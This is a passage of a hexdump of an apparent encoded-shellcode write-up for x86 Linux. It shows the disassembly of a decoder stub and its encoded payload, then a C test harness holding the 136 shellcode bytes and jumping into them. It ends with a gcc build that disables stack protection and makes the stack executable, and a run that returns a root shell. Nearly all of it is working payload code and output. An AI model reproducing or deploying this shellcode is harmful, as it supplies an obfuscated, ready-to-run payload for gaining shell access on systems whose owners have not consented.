00002800  20 20 20 20 20 20 20 20  20 20 6d 6f 76 20 20 20  |          mov   |
00002810  20 61 6c 2c 63 6c 0a 20  38 30 34 38 30 39 39 3a  | al,cl. 8048099:|
00002820  20 20 20 20 20 20 20 63  30 20 65 62 20 30 34 20  |       c0 eb 04 |
00002830  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 73  |               s|
00002840  68 72 20 20 20 20 62 6c  2c 30 78 34 0a 20 38 30  |hr    bl,0x4. 80|
00002850  34 38 30 39 63 3a 20 20  20 20 20 20 20 63 31 20  |4809c:       c1 |
00002860  65 30 20 31 63 20 20 20  20 20 20 20 20 20 20 20  |e0 1c           |
00002870  20 20 20 20 20 73 68 6c  20 20 20 20 65 61 78 2c  |     shl    eax,|
00002880  30 78 31 63 0a 20 38 30  34 38 30 39 66 3a 20 20  |0x1c. 804809f:  |
00002890  20 20 20 20 20 63 31 20  65 38 20 31 38 20 20 20  |     c1 e8 18   |
000028a0  20 20 20 20 20 20 20 20  20 20 20 20 20 73 68 72  |             shr|
000028b0  20 20 20 20 65 61 78 2c  30 78 31 38 0a 20 38 30  |    eax,0x18. 80|
000028c0  34 38 30 61 32 3a 20 20  20 20 20 20 20 30 31 20  |480a2:       01 |
000028d0  64 38 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |d8              |
000028e0  20 20 20 20 20 61 64 64  20 20 20 20 65 61 78 2c  |     add    eax,|
000028f0  65 62 78 0a 20 38 30 34  38 30 61 34 3a 20 20 20  |ebx. 80480a4:   |
00002900  20 20 20 20 62 33 20 66  66 20 20 20 20 20 20 20  |    b3 ff       |
00002910  20 20 20 20 20 20 20 20  20 20 20 20 6d 6f 76 20  |            mov |
00002920  20 20 20 62 6c 2c 30 78  66 66 0a 20 38 30 34 38  |   bl,0xff. 8048|
00002930  30 61 36 3a 20 20 20 20  20 20 20 32 38 20 63 33  |0a6:       28 c3|
00002940  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00002950  20 20 20 73 75 62 20 20  20 20 62 6c 2c 61 6c 0a  |   sub    bl,al.|
00002960  20 38 30 34 38 30 61 38  3a 20 20 20 20 20 20 20  | 80480a8:       |
00002970  38 38 20 31 66 20 20 20  20 20 20 20 20 20 20 20  |88 1f           |
00002980  20 20 20 20 20 20 20 20  6d 6f 76 20 20 20 20 42  |        mov    B|
00002990  59 54 45 20 50 54 52 20  5b 65 64 69 5d 2c 62 6c  |YTE PTR [edi],bl|
000029a0  0a 20 38 30 34 38 30 61  61 3a 20 20 20 20 20 20  |. 80480aa:      |
000029b0  20 34 37 20 20 20 20 20  20 20 20 20 20 20 20 20  | 47             |
000029c0  20 20 20 20 20 20 20 20  20 69 6e 63 20 20 20 20  |         inc    |
000029d0  65 64 69 0a 20 38 30 34  38 30 61 62 3a 20 20 20  |edi. 80480ab:   |
000029e0  20 20 20 20 38 33 20 63  35 20 30 32 20 20 20 20  |    83 c5 02    |
000029f0  20 20 20 20 20 20 20 20  20 20 20 20 61 64 64 20  |            add |
00002a00  20 20 20 65 62 70 2c 30  78 32 0a 20 38 30 34 38  |   ebp,0x2. 8048|
00002a10  30 61 65 3a 20 20 20 20  20 20 20 65 62 20 64 30  |0ae:       eb d0|
00002a20  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00002a30  20 20 20 6a 6d 70 20 20  20 20 38 30 34 38 30 38  |   jmp    804808|
00002a40  30 20 3c 64 65 63 6f 64  65 5f 70 72 3e 0a 0a 30  |0 <decode_pr>..0|
00002a50  38 30 34 38 30 62 30 20  3c 63 61 6c 6c 5f 73 68  |80480b0 <call_sh|
00002a60  65 6c 6c 63 6f 64 65 3e  3a 0a 20 38 30 34 38 30  |ellcode>:. 80480|
00002a70  62 30 3a 20 20 20 20 20  20 20 65 38 20 61 64 20  |b0:       e8 ad |
00002a80  66 66 20 66 66 20 66 66  20 20 20 20 20 20 20 20  |ff ff ff        |
00002a90  20 20 63 61 6c 6c 20 20  20 38 30 34 38 30 36 32  |  call   8048062|
00002aa0  20 3c 64 65 63 6f 64 65  72 3e 0a 0a 30 38 30 34  | <decoder>..0804|
00002ab0  38 30 62 35 20 3c 45 6e  63 6f 64 65 64 53 68 65  |80b5 <EncodedShe|
00002ac0  6c 6c 63 6f 64 65 3e 3a  0a 20 38 30 34 38 30 62  |llcode>:. 80480b|
00002ad0  35 3a 20 20 20 20 20 20  20 34 33 20 20 20 20 20  |5:       43     |
00002ae0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00002af0  20 69 6e 63 20 20 20 20  65 62 78 0a 20 38 30 34  | inc    ebx. 804|
00002b00  38 30 62 36 3a 20 20 20  20 20 20 20 65 64 20 20  |80b6:       ed  |
00002b10  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00002b20  20 20 20 20 69 6e 20 20  20 20 20 65 61 78 2c 64  |    in     eax,d|
00002b30  78 0a 20 38 30 34 38 30  62 37 3a 20 20 20 20 20  |x. 80480b7:     |
00002b40  20 20 31 64 20 66 34 20  34 30 20 66 62 20 36 66  |  1d f4 40 fb 6f|
00002b50  20 20 20 20 20 20 20 20  20 20 73 62 62 20 20 20  |          sbb   |
00002b60  20 65 61 78 2c 30 78 36  66 66 62 34 30 66 34 0a  | eax,0x6ffb40f4.|
00002b70  20 38 30 34 38 30 62 63  3a 20 20 20 20 20 20 20  | 80480bc:       |
00002b80  37 61 20 61 39 20 20 20  20 20 20 20 20 20 20 20  |7a a9           |
00002b90  20 20 20 20 20 20 20 20  6a 70 20 20 20 20 20 38  |        jp     8|
00002ba0  30 34 38 30 36 37 20 3c  64 65 63 6f 64 65 72 2b  |048067 <decoder+|
00002bb0  30 78 35 3e 0a 20 38 30  34 38 30 62 65 3a 20 20  |0x5>. 80480be:  |
00002bc0  20 20 20 20 20 30 65 20  20 20 20 20 20 20 20 20  |     0e         |
00002bd0  20 20 20 20 20 20 20 20  20 20 20 20 20 70 75 73  |             pus|
00002be0  68 20 20 20 63 73 0a 20  38 30 34 38 30 62 66 3a  |h   cs. 80480bf:|
00002bf0  20 20 20 20 20 20 20 62  36 20 30 65 20 20 20 20  |       b6 0e    |
00002c00  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 6d  |               m|
00002c10  6f 76 20 20 20 20 64 68  2c 30 78 65 0a 20 38 30  |ov    dh,0xe. 80|
00002c20  34 38 30 63 31 3a 20 20  20 20 20 20 20 62 63 20  |480c1:       bc |
00002c30  63 39 20 65 33 20 37 61  20 61 66 20 20 20 20 20  |c9 e3 7a af     |
00002c40  20 20 20 20 20 6d 6f 76  20 20 20 20 65 73 70 2c  |     mov    esp,|
00002c50  30 78 61 66 37 61 65 33  63 39 0a 20 38 30 34 38  |0xaf7ae3c9. 8048|
00002c60  30 63 36 3a 20 20 20 20  20 20 20 37 61 20 37 38  |0c6:       7a 78|
00002c70  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00002c80  20 20 20 6a 70 20 20 20  20 20 38 30 34 38 31 34  |   jp     804814|
00002c90  30 20 3c 45 6e 63 6f 64  65 64 53 68 65 6c 6c 63  |0 <EncodedShellc|
00002ca0  6f 64 65 2b 30 78 38 62  3e 0a 20 38 30 34 38 30  |ode+0x8b>. 80480|
00002cb0  63 38 3a 20 20 20 20 20  20 20 30 65 20 20 20 20  |c8:       0e    |
00002cc0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00002cd0  20 20 70 75 73 68 20 20  20 63 73 0a 20 38 30 34  |  push   cs. 804|
00002ce0  38 30 63 39 3a 20 20 20  20 20 20 20 63 35 20 64  |80c9:       c5 d|
00002cf0  61 20 37 36 20 20 20 20  20 20 20 20 20 20 20 20  |a 76            |
00002d00  20 20 20 20 28 62 61 64  29 20 20 0a 20 38 30 34  |    (bad)  . 804|
00002d10  38 30 63 63 3a 20 20 20  20 20 20 20 36 61 20 31  |80cc:       6a 1|
00002d20  37 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |7               |
00002d30  20 20 20 20 70 75 73 68  20 20 20 30 78 31 37 0a  |    push   0x17.|
00002d40  20 38 30 34 38 30 63 65  3a 20 20 20 20 20 20 20  | 80480ce:       |
00002d50  31 61 20 34 65 20 36 38  20 20 20 20 20 20 20 20  |1a 4e 68        |
00002d60  20 20 20 20 20 20 20 20  73 62 62 20 20 20 20 63  |        sbb    c|
00002d70  6c 2c 42 59 54 45 20 50  54 52 20 5b 65 73 69 2b  |l,BYTE PTR [esi+|
00002d80  30 78 36 38 5d 0a 20 38  30 34 38 30 64 31 3a 20  |0x68]. 80480d1: |
00002d90  20 20 20 20 20 20 33 38  20 63 32 20 20 20 20 20  |      38 c2     |
00002da0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 63 6d  |              cm|
00002db0  70 20 20 20 20 64 6c 2c  61 6c 0a 20 38 30 34 38  |p    dl,al. 8048|
00002dc0  30 64 33 3a 20 20 20 20  20 20 20 39 39 20 20 20  |0d3:       99   |
00002dd0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00002de0  20 20 20 63 64 71 20 20  20 20 0a 20 38 30 34 38  |   cdq    . 8048|
00002df0  30 64 34 3a 20 20 20 20  20 20 20 66 62 20 20 20  |0d4:       fb   |
00002e00  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00002e10  20 20 20 73 74 69 20 20  20 20 0a 20 38 30 34 38  |   sti    . 8048|
00002e20  30 64 35 3a 20 20 20 20  20 20 20 33 35 20 36 38  |0d5:       35 68|
00002e30  20 38 34 20 64 32 20 62  33 20 20 20 20 20 20 20  | 84 d2 b3       |
00002e40  20 20 20 78 6f 72 20 20  20 20 65 61 78 2c 30 78  |   xor    eax,0x|
00002e50  62 33 64 32 38 34 36 38  0a 20 38 30 34 38 30 64  |b3d28468. 80480d|
00002e60  61 3a 20 20 20 20 20 20  20 63 62 20 20 20 20 20  |a:       cb     |
00002e70  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00002e80  20 72 65 74 66 20 20 20  0a 20 38 30 34 38 30 64  | retf   . 80480d|
00002e90  62 3a 20 20 20 20 20 20  20 37 63 20 36 38 20 20  |b:       7c 68  |
00002ea0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00002eb0  20 6a 6c 20 20 20 20 20  38 30 34 38 31 34 35 20  | jl     8048145 |
00002ec0  3c 45 6e 63 6f 64 65 64  53 68 65 6c 6c 63 6f 64  |<EncodedShellcod|
00002ed0  65 2b 30 78 39 30 3e 0a  20 38 30 34 38 30 64 64  |e+0x90>. 80480dd|
00002ee0  3a 20 20 20 20 20 20 20  37 38 20 65 32 20 20 20  |:       78 e2   |
00002ef0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00002f00  6a 73 20 20 20 20 20 38  30 34 38 30 63 31 20 3c  |js     80480c1 <|
00002f10  45 6e 63 6f 64 65 64 53  68 65 6c 6c 63 6f 64 65  |EncodedShellcode|
00002f20  2b 30 78 63 3e 0a 20 38  30 34 38 30 64 66 3a 20  |+0xc>. 80480df: |
00002f30  20 20 20 20 20 20 39 61  20 66 35 20 65 39 20 35  |      9a f5 e9 5|
00002f40  30 20 63 30 20 32 34 20  39 31 20 20 20 20 63 61  |0 c0 24 91    ca|
00002f50  6c 6c 20 20 20 30 78 39  31 32 34 3a 30 78 63 30  |ll   0x9124:0xc0|
00002f60  35 30 65 39 66 35 0a 20  38 30 34 38 30 65 36 3a  |50e9f5. 80480e6:|
00002f70  20 20 20 20 20 20 20 66  38 20 20 20 20 20 20 20  |       f8       |
00002f80  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 63  |               c|
00002f90  6c 63 20 20 20 20 0a 20  38 30 34 38 30 65 37 3a  |lc    . 80480e7:|
00002fa0  20 20 20 20 20 20 20 66  65 20 20 20 20 20 20 20  |       fe       |
00002fb0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2e  |               .|
00002fc0  62 79 74 65 20 30 78 66  65 0a 2d 2d 2d 2d 2d 2d  |byte 0xfe.------|
00002fd0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00003020  2d 2d 2d 2d 2d 0a 0a 24  20 63 61 74 20 73 68 65  |-----..$ cat she|
00003030  6c 6c 63 6f 64 65 2e 63  0a 23 69 6e 63 6c 75 64  |llcode.c.#includ|
00003040  65 3c 73 74 64 69 6f 2e  68 3e 0a 23 69 6e 63 6c  |e<stdio.h>.#incl|
00003050  75 64 65 3c 73 74 72 69  6e 67 2e 68 3e 0a 75 6e  |ude<string.h>.un|
00003060  73 69 67 6e 65 64 20 63  68 61 72 20 63 6f 64 65  |signed char code|
00003070  5b 5d 20 3d 5c 0a 22 5c  78 65 62 5c 78 34 65 5c  |[] =\."\xeb\x4e\|
00003080  78 35 65 5c 78 38 64 5c  78 33 65 5c 78 33 31 5c  |x5e\x8d\x3e\x31\|
00003090  78 63 39 5c 78 66 37 5c  78 65 31 5c 78 33 31 5c  |xc9\xf7\xe1\x31\|
000030a0  78 65 64 5c 78 38 61 5c  78 31 36 5c 78 38 38 5c  |xed\x8a\x16\x88\|
000030b0  78 64 30 5c 78 63 30 5c  78 65 61 5c 78 30 34 5c  |xd0\xc0\xea\x04\|
000030c0  78 63 31 5c 78 65 30 5c  78 31 63 5c 78 63 31 5c  |xc1\xe0\x1c\xc1\|
000030d0  78 65 38 5c 78 31 63 5c  78 32 38 5c 78 63 32 5c  |xe8\x1c\x28\xc2\|
000030e0  78 37 39 5c 78 30 34 5c  78 66 36 5c 78 64 32 5c  |x79\x04\xf6\xd2\|
000030f0  78 66 65 5c 78 63 32 5c  78 33 31 5c 78 63 30 5c  |xfe\xc2\x31\xc0\|
00003100  78 33 31 5c 78 64 62 5c  78 33 31 5c 78 63 39 5c  |x31\xdb\x31\xc9\|
00003110  78 38 61 5c 78 34 34 5c  78 32 65 5c 78 30 31 5c  |x8a\x44\x2e\x01\|
00003120  78 38 39 5c 78 65 39 5c  78 38 30 5c 78 66 31 5c  |x89\xe9\x80\xf1\|
00003130  78 33 32 5c 78 37 34 5c  78 32 34 5c 78 38 38 5c  |x32\x74\x24\x88\|
00003140  78 63 31 5c 78 32 38 5c  78 64 31 5c 78 38 38 5c  |xc1\x28\xd1\x88\|
00003150  78 63 62 5c 78 38 38 5c  78 63 38 5c 78 63 30 5c  |xcb\x88\xc8\xc0\|
00003160  78 65 62 5c 78 30 34 5c  78 63 31 5c 78 65 30 5c  |xeb\x04\xc1\xe0\|
00003170  78 31 63 5c 78 63 31 5c  78 65 38 5c 78 31 38 5c  |x1c\xc1\xe8\x18\|
00003180  78 30 31 5c 78 64 38 5c  78 62 33 5c 78 66 66 5c  |x01\xd8\xb3\xff\|
00003190  78 32 38 5c 78 63 33 5c  78 38 38 5c 78 31 66 5c  |x28\xc3\x88\x1f\|
000031a0  78 34 37 5c 78 38 33 5c  78 63 35 5c 78 30 32 5c  |x47\x83\xc5\x02\|
000031b0  78 65 62 5c 78 64 30 5c  78 65 38 5c 78 61 64 5c  |xeb\xd0\xe8\xad\|
000031c0  78 66 66 5c 78 66 66 5c  78 66 66 5c 78 34 33 5c  |xff\xff\xff\x43\|
000031d0  78 65 64 5c 78 31 64 5c  78 66 34 5c 78 34 30 5c  |xed\x1d\xf4\x40\|
000031e0  78 66 62 5c 78 36 66 5c  78 37 61 5c 78 61 39 5c  |xfb\x6f\x7a\xa9\|
000031f0  78 30 65 5c 78 62 36 5c  78 30 65 5c 78 62 63 5c  |x0e\xb6\x0e\xbc\|
00003200  78 63 39 5c 78 65 33 5c  78 37 61 5c 78 61 66 5c  |xc9\xe3\x7a\xaf\|
00003210  78 37 61 5c 78 37 38 5c  78 30 65 5c 78 63 35 5c  |x7a\x78\x0e\xc5\|
00003220  78 64 61 5c 78 37 36 5c  78 36 61 5c 78 31 37 5c  |xda\x76\x6a\x17\|
00003230  78 31 61 5c 78 34 65 5c  78 36 38 5c 78 33 38 5c  |x1a\x4e\x68\x38\|
00003240  78 63 32 5c 78 39 39 5c  78 66 62 5c 78 33 35 5c  |xc2\x99\xfb\x35\|
00003250  78 36 38 5c 78 38 34 5c  78 64 32 5c 78 62 33 5c  |x68\x84\xd2\xb3\|
00003260  78 63 62 5c 78 37 63 5c  78 36 38 5c 78 37 38 5c  |xcb\x7c\x68\x78\|
00003270  78 65 32 5c 78 39 61 5c  78 66 35 5c 78 65 39 5c  |xe2\x9a\xf5\xe9\|
00003280  78 35 30 5c 78 63 30 5c  78 32 34 5c 78 39 31 5c  |x50\xc0\x24\x91\|
00003290  78 66 38 5c 78 66 65 22  3b 0a 0a 6d 61 69 6e 28  |xf8\xfe";..main(|
000032a0  29 0a 7b 0a 20 20 20 20  20 20 20 20 70 72 69 6e  |).{.        prin|
000032b0  74 66 28 22 53 68 65 6c  6c 63 6f 64 65 20 4c 65  |tf("Shellcode Le|
000032c0  6e 67 74 68 3a 20 20 25  64 5c 6e 22 2c 20 73 74  |ngth:  %d\n", st|
000032d0  72 6c 65 6e 28 63 6f 64  65 29 29 3b 0a 20 20 20  |rlen(code));.   |
000032e0  20 20 20 20 20 69 6e 74  20 28 2a 72 65 74 29 28  |     int (*ret)(|
000032f0  29 20 3d 20 28 69 6e 74  28 2a 29 28 29 29 63 6f  |) = (int(*)())co|
00003300  64 65 3b 0a 20 20 20 20  20 20 20 20 72 65 74 28  |de;.        ret(|
00003310  29 3b 0a 7d 0a 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |);.}.-----------|
00003320  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00003370  0a 0a 24 20 67 63 63 20  2d 66 6e 6f 2d 73 74 61  |..$ gcc -fno-sta|
00003380  63 6b 2d 70 72 6f 74 65  63 74 6f 72 20 2d 7a 20  |ck-protector -z |
00003390  65 78 65 63 73 74 61 63  6b 20 73 68 65 6c 6c 63  |execstack shellc|
000033a0  6f 64 65 2e 63 20 2d 6f  20 73 68 65 6c 6c 63 6f  |ode.c -o shellco|
000033b0  64 65 0a 24 20 2e 2f 73  68 65 6c 6c 63 6f 64 65  |de.$ ./shellcode|
000033c0  0a 53 68 65 6c 6c 63 6f  64 65 20 4c 65 6e 67 74  |.Shellcode Lengt|
000033d0  68 3a 20 20 31 33 36 0a  24 77 68 6f 61 6d 69 20  |h:  136.$whoami |
000033e0  0a 72 6f 6f 74 0a 24                              |.root.$|
000033e7
